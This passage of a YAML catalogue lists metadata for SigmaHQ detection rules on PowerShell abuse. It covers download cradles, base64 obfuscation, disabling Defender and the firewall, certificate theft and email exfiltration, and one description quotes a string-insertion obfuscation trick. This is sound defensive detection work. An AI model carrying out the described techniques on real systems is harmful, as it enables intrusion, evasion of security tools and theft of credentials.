  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://2019.offzone.moscow/ru/report/hunting-for-powershell-abuses/
  - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=66
  false_positives:
  - Unlikely
  notes: ''
- detection_id: d7bcd677-645d-4691-a8d4-7a5602b780d1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_cmdline_special_characters.yml
  name: Potential PowerShell Command Line Obfuscation
  description: Detects the PowerShell command lines with special characters
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.t1027
  - attack.t1059.001
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=64
  false_positives:
  - Amazon SSM Document Worker
  - Windows Defender ATP
  notes: ''
- detection_id: 7b6a7418-3afc-11f0-aff4-000d3abf478c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_comobject_msi.yml
  name: Obfuscated PowerShell MSI Install via WindowsInstaller COM
  description: 'Detects the execution of obfuscated PowerShell commands that attempt
    to install MSI packages via the Windows Installer COM object (`WindowsInstaller.Installer`).

    The technique involves manipulating strings to hide functionality, such as constructing
    class names using string insertion (e.g., ''indowsInstaller.Installer''.Insert(0,''W''))
    and correcting

    malformed URLs (e.g., converting ''htps://'' to ''https://'') at runtime. This
    behavior is commonly associated with malware loaders or droppers that aim to bypass
    static detection

    by hiding intent in runtime-generated strings and using legitimate tools for code
    execution. The use of `InstallProduct` and COM object creation, particularly combined
    with

    hidden window execution and suppressed UI, indicates an attempt to install software
    (likely malicious) without user interaction.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - multi_signal_correlation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027.010
  - T1059.001
  - T1218.007
  tags:
  - attack.defense-evasion
  - attack.t1027.010
  - attack.t1218.007
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://informationsecuritybuzz.com/the-real-danger-behind-a-simple-windows-shortcut/
  - https://redcanary.com/blog/threat-intelligence/intelligence-insights-may-2025/
  - https://www.virustotal.com/gui/file/f9710b0ba4de5fa0e7ec27da462d4d2fc6838eba83a19f23f6617a466bbad457
  false_positives:
  - Unknown
  notes: ''
- detection_id: 222720a7-047f-4054-baa5-bab9be757db0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_comobject_msi_remote.yml
  name: PowerShell MSI Install via WindowsInstaller COM From Remote Location
  description: 'Detects the execution of PowerShell commands that attempt to install
    MSI packages via the

    Windows Installer COM object (`WindowsInstaller.Installer`) hosted remotely.

    This could be indication of malicious software deployment or lateral movement
    attempts using Windows Installer functionality.

    And the usage of WindowsInstaller COM object rather than msiexec could be an attempt
    to bypass the detection.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  - T1105
  - T1218
  tags:
  - attack.execution
  - attack.t1059.001
  - attack.defense-evasion
  - attack.t1218
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://informationsecuritybuzz.com/the-real-danger-behind-a-simple-windows-shortcut/
  - https://redcanary.com/blog/threat-intelligence/intelligence-insights-may-2025/
  - https://www.virustotal.com/gui/file/f9710b0ba4de5fa0e7ec27da462d4d2fc6838eba83a19f23f6617a466bbad457
  false_positives:
  - Unknown
  notes: ''
- detection_id: 435e10e4-992a-4281-96f3-38b11106adde
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_computer_discovery_get_adcomputer.yml
  name: Computer Discovery And Export Via Get-ADComputer Cmdlet
  description: Detects usage of the Get-ADComputer cmdlet to collect computer information
    and output it to a file
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1033
  tags:
  - attack.discovery
  - attack.t1033
  time_window: ''
  references:
  - http://blog.talosintelligence.com/2022/09/lazarus-three-rats.html
  - https://www.microsoft.com/en-us/security/blog/2022/10/18/defenders-beware-a-case-for-post-ransomware-investigations/
  - https://www.cisa.gov/uscert/sites/default/files/publications/aa22-320a_joint_csa_iranian_government-sponsored_apt_actors_compromise_federal%20network_deploy_crypto%20miner_credential_harvester.pdf
  false_positives:
  - Legitimate admin scripts may use the same technique, it's better to exclude specific
    computers or users who execute these commands or scripts often
  notes: ''
- detection_id: f4ff7323-b5fc-4323-8b52-6b9408e15788
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_console_history_file_access.yml
  name: Potential PowerShell Console History Access Attempt via History File
  description: 'Detects potential access attempts to the PowerShell console history
    directly via history file (ConsoleHost_history.txt).

    This can give access to plaintext passwords used in PowerShell commands or used
    for general reconnaissance.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1552.001
  tags:
  - attack.credential-access
  - attack.t1552.001
  time_window: ''
  references:
  - https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html
  false_positives:
  - Legitimate access of the console history file is possible
  notes: ''
- detection_id: c02e96b7-c63a-4c47-bd83-4a9f74afcfb2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_create_service.yml
  name: New Service Creation Using PowerShell
  description: Detects the creation of a new service using powershell.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543.003
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1543.003
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1543.003/T1543.003.md
  false_positives:
  - Legitimate administrator or user creates a service for legitimate reasons.
  - Software installation
  notes: ''
- detection_id: 98767d61-b2e8-4d71-b661-e36783ee24c1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_decode_gzip.yml
  name: Gzip Archive Decode Via PowerShell
  description: Detects attempts of decoding encoded Gzip archives via PowerShell.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1132.001
  tags:
  - attack.command-and-control
  - attack.t1132.001
  time_window: ''
  references:
  - https://www.zscaler.com/blogs/security-research/onenote-growing-threat-malware-distribution
  false_positives:
  - Legitimate administrative scripts may use this functionality. Use "ParentImage"
    in combination with the script names and allowed users and applications to filter
    legitimate executions
  notes: ''
- detection_id: 434c08ba-8406-4d15-8b24-782cb071a691
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_decrypt_pattern.yml
  name: PowerShell Execution With Potential Decryption Capabilities
  description: Detects PowerShell commands that decrypt an ".LNK" "file to drop the
    next stage of the malware.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://research.checkpoint.com/2023/chinese-threat-actors-targeting-europe-in-smugx-campaign/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 1ec65a5f-9473-4f12-97da-622044d6df21
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_defender_disable_feature.yml
  name: Powershell Defender Disable Scan Feature
  description: Detects requests to disable Microsoft Defender features using PowerShell
    commands
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/powershell/module/defender/set-mppreference?view=windowsserver2022-ps
  - https://www.virustotal.com/gui/file/d609799091731d83d75ec5d1f030571af20c45efeeb94840b67ea09a3283ab65/behavior/C2AE
  - https://www.virustotal.com/gui/search/content%253A%2522Set-MpPreference%2520-Disable%2522/files
  false_positives:
  - Possible administrative activity
  - Other Cmdlets that may use the same parameters
  notes: ''
- detection_id: 17769c90-230e-488b-a463-e05c08e9d48f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_defender_exclusion.yml
  name: Powershell Defender Exclusion
  description: Detects requests to exclude files, folders or processes from Antivirus
    scanning using PowerShell cmdlets
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/defender-endpoint/configure-process-opened-file-exclusions-microsoft-defender-antivirus
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md
  - https://twitter.com/AdamTheAnalyst/status/1483497517119590403
  false_positives:
  - Possible Admin Activity
  - Other Cmdlets that may use the same parameters
  notes: ''
- detection_id: a7ee1722-c3c5-aeff-3212-c777e4733217
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_disable_defender_av_security_monitoring.yml
  name: Disable Windows Defender AV Security Monitoring
  description: Detects attackers attempting to disable Windows Defender using Powershell
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://research.nccgroup.com/2020/06/23/wastedlocker-a-new-ransomware-variant-developed-by-the-evil-corp-group/
  - https://rvsec0n.wordpress.com/2020/01/24/malwares-that-bypass-windows-defender/
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md
  false_positives:
  - Minimal, for some older versions of dev tools, such as pycharm, developers were
    known to sometimes disable Windows Defender to improve performance, but this generally
    is not considered a good security practice.
  notes: ''
- detection_id: 12f6b752-042d-483e-bf9c-915a6d06ad75
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_disable_firewall.yml
  name: Windows Firewall Disabled via PowerShell
  description: Detects attempts to disable the Windows Firewall using PowerShell
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562
  tags:
  - attack.defense-evasion
  - attack.t1562
  time_window: ''
  references:
  - https://www.elastic.co/guide/en/security/current/windows-firewall-disabled-via-powershell.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: fb50eb7a-5ab1-43ae-bcc9-091818cb8424
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_disable_ie_features.yml
  name: Disabled IE Security Features
  description: Detects command lines that indicate unwanted modifications to registry
    keys that disable important Internet Explorer security features
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://unit42.paloaltonetworks.com/operation-ke3chang-resurfaces-with-new-tidepool-malware/
  false_positives:
  - Unknown
  notes: ''
- detection_id: b3512211-c67e-4707-bedc-66efc7848863
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_downgrade_attack.yml
  name: Potential PowerShell Downgrade Attack
  description: Detects PowerShell downgrade attack by comparing the host versions
    with the actually used engine version 2.0
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - http://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/
  - https://github.com/r00t-3xp10it/hacking-material-books/blob/43cb1e1932c16ff1f58b755bc9ab6b096046853f/obfuscation/simple_obfuscation.md#bypass-or-avoid-amsi-by-version-downgrade-
  false_positives:
  - Unknown
  notes: ''
- detection_id: 02b64f1b-3f33-4e67-aede-ef3b0a5a8fcf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_download_com_cradles.yml
  name: Potential COM Objects Download Cradles Usage - Process Creation
  description: Detects usage of COM objects that can be abused to download files in
    PowerShell by CLSID
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/dotnet/api/system.type.gettypefromclsid?view=net-7.0
  - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=57
  false_positives:
  - Legitimate use of the library
  notes: ''
- detection_id: 44e24481-6202-4c62-9127-5a0ae8e3fe3d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_download_cradle_obfuscated.yml
  name: Obfuscated PowerShell OneLiner Execution
  description: Detects the execution of a specific OneLiner to download and execute
    powershell modules in memory.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1059.001
  - attack.t1562.001
  time_window: ''
  references:
  - https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/
  - https://gist.github.com/mgeeky/3b11169ab77a7de354f4111aa2f0df38
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0f0450f3-8b47-441e-a31b-15a91dc243e2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_download_dll.yml
  name: Potential DLL File Download Via PowerShell Invoke-WebRequest
  description: Detects potential DLL files being downloaded using the PowerShell Invoke-WebRequest
    or Invoke-RestMethod cmdlets.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  - T1105
  tags:
  - attack.command-and-control
  - attack.execution
  - attack.t1059.001
  - attack.t1105
  time_window: ''
  references:
  - https://www.zscaler.com/blogs/security-research/onenote-growing-threat-malware-distribution
  false_positives:
  - Unknown
  notes: ''
- detection_id: 85b0b087-eddf-4a2b-b033-d771fa2b9775
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_download_iex.yml
  name: PowerShell Download and Execution Cradles
  description: Detects PowerShell download and execution cradles.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd
  - https://labs.withsecure.com/publications/fin7-target-veeam-servers
  false_positives:
  - Some PowerShell installers were seen using similar combinations. Apply filters
    accordingly
  notes: ''
- detection_id: 3b6ab547-8ec2-4991-b9d2-2b06702a48d7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_download_patterns.yml
  name: PowerShell Download Pattern
  description: Detects a Powershell process that contains download commands in its
    command line string
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://blog.redteam.pl/2020/06/black-kingdom-ransomware.html
  - https://lab52.io/blog/winter-vivern-all-summer/
  - https://hatching.io/blog/powershell-analysis/
  false_positives:
  - Unknown
  notes: ''
- detection_id: b6e04788-29e1-4557-bb14-77f761848ab8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_download_susp_file_sharing_domains.yml
  name: Potentially Suspicious File Download From File Sharing Domain Via PowerShell.EXE
  description: Detects potentially suspicious file downloads from file sharing domains
    using PowerShell.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://labs.withsecure.com/publications/fin7-target-veeam-servers
  - https://github.com/WithSecureLabs/iocs/blob/344203de742bb7e68bd56618f66d34be95a9f9fc/FIN7VEEAM/iocs.csv
  - https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/
  - https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708
  false_positives:
  - Unknown
  notes: ''
- detection_id: 43d91656-a9b2-4541-b7e2-6a9bd3a13f4e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_dsinternals_cmdlets.yml
  name: DSInternals Suspicious PowerShell Cmdlets
  description: 'Detects execution and usage of the DSInternals PowerShell module.
    Which can be used to perform what might be considered as suspicious activity such
    as dumping DPAPI backup keys or manipulating NTDS.DIT files.

    The DSInternals PowerShell Module exposes several internal features of Active
    Directory and Azure Active Directory. These include FIDO2 and NGC key auditing,
    offline ntds.dit file manipulation, password auditing, DC recovery from IFM backups
    and password hash calculation.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 9
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/MichaelGrafnetter/DSInternals/blob/39ee8a69bbdc1cfd12c9afdd7513b4788c4895d4/Src/DSInternals.PowerShell/DSInternals.psd1
  false_positives:
  - Legitimate usage of DSInternals for administration or audit purpose.
  notes: ''
- detection_id: 312d0384-401c-4b8b-abdf-685ffba9a332
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_email_exfil.yml
  name: Email Exifiltration Via Powershell
  description: Detects email exfiltration via powershell cmdlets
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Exfiltration
  techniques: []
  tags:
  - attack.exfiltration
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2022/09/07/profiling-dev-0270-phosphorus-ransomware-operations/
  - https://github.com/Azure/Azure-Sentinel/blob/7e6aa438e254d468feec061618a7877aa528ee9f/Hunting%20Queries/Microsoft%20365%20Defender/Ransomware/DEV-0270/Email%20data%20exfiltration%20via%20PowerShell.yaml
  false_positives:
  - Unknown
  notes: ''
- detection_id: c740d4cf-a1e9-41de-bb16-8a46a4f57918
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_enable_susp_windows_optional_feature.yml
  name: Potential Suspicious Windows Feature Enabled - ProcCreation
  description: 'Detects usage of the built-in PowerShell cmdlet "Enable-WindowsOptionalFeature"
    used as a Deployment Image Servicing and Management tool.

    Similar to DISM.exe, this cmdlet is used to enumerate, install, uninstall, configure,
    and update features and packages in Windows images

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/powershell/module/dism/enable-windowsoptionalfeature?view=windowsserver2022-ps
  - https://learn.microsoft.com/en-us/windows/win32/projfs/enabling-windows-projected-file-system
  - https://learn.microsoft.com/en-us/windows/wsl/install-on-server
  false_positives:
  - Legitimate usage of the features listed in the rule.
  notes: ''
- detection_id: fb843269-508c-4b76-8b8d-88679db22ce7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_encode.yml
  name: Suspicious Execution of Powershell with Base64
  description: Commandline to launch powershell with a base64 payload
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1059.001/T1059.001.md#atomic-test-20---powershell-invoke-known-malicious-cmdlets
  - https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/
  - https://mikefrobbins.com/2017/06/15/simple-obfuscation-with-powershell-using-base64-encoding/
  false_positives:
  - Unknown
  notes: ''
- detection_id: cdf05894-89e7-4ead-b2b0-0a5f97a90f2f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_encoding_patterns.yml
  name: Potential Encoded PowerShell Patterns In CommandLine
  description: Detects specific combinations of encoding methods in PowerShell via
    the commandline
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - multi_signal_correlation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=65
  false_positives:
  - Unknown
  notes: ''
- detection_id: ee218c12-627a-4d27-9e30-d6fb2fe22ed2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_exec_data_file.yml
  name: Powershell Inline Execution From A File
  description: Detects inline execution of PowerShell code from a file
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=50
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9e716b33-63b2-46da-86a4-bd3c3b9b5dfb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_export_certificate.yml
  name: Certificate Exported Via PowerShell
  description: Detects calls to cmdlets that are used to export certificates from
    the local certificate store. Threat actors were seen abusing this to steal private
    keys from compromised machines.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  - T1552.004
  tags:
  - attack.credential-access
  - attack.execution
  - attack.t1552.004
  - attack.t1059.001
  time_window: ''
  references:
  - https://us-cert.cisa.gov/ncas/analysis-reports/ar21-112a
  - https://learn.microsoft.com/en-us/powershell/module/pki/export-pfxcertificate?view=windowsserver2022-ps
  - https://www.splunk.com/en_us/blog/security/breaking-the-chain-defending-against-certificate-services-abuse.html
  false_positives:
  - Legitimate certificate exports by administrators. Additional filters might be
    required.
  notes: ''
- detection_id: e32d4572-9826-4738-b651-95fa63747e8a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_frombase64string.yml
  name: Base64 Encoded PowerShell Command Detected
  description: Detects usage of the "FromBase64String" function in the commandline
    which is used to decode a base64 encoded string
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  - T1140
  tags:
  - attack.t1027
  - attack.defense-evasion
  - attack.execution
  - attack.t1140
  - attack.t1059.001
  time_window: ''
  references:
  - https://gist.github.com/Neo23x0/6af876ee72b51676c82a2db8d2cd3639
  false_positives:
  - Administrative script libraries
  notes: ''
- detection_id: d75d6b6b-adb9-48f7-824b-ac2e786efe1f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_frombase64string_archive.yml
  name: Suspicious FromBase64String Usage On Gzip Archive - Process Creation
  description: Detects attempts of decoding a base64 Gzip archive via PowerShell.
    This technique is often used as a method to load malicious content into memory
    afterward.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1132.001
  tags:
  - attack.command-and-control
  - attack.t1132.001
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=43
  false_positives:
  - Legitimate administrative script
  notes: ''
- detection_id: b9aeac14-2ffd-4ad3-b967-1354a4e628c3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_powershell_get_clipboard.yml
  name: PowerShell Get-Clipboard Cmdlet Via CLI
  description: Detects usage of the 'Get-Clipboard' cmdlet via CLI
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1115
  tags:
  - attack.collection
  - attack.t1115
  time_window: ''
  references:
